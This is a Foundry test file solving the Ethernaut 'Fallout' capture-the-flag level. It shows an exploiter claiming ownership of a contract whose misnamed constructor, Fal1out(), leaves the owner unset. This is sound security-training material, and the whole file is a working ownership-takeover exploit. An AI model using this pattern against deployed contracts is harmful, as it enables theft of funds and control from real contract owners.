// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Fallout.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

contract FalloutExploit is Test {
  Fallout target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Fallout();
    console.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    // The owner is not initialized because the constructor is wrongly named!
    address owner = target.owner();
    console.log('Current owner: %s', owner);
    assertEq(owner, address(0x0));

    vm.startPrank(exploiter);
    // Claim the ownership of the contract.
    target.Fal1out();
    vm.stopPrank();

    owner = target.owner();
    console.log('New owner: %s', owner);
    assertEq(owner, exploiter);
  }
}
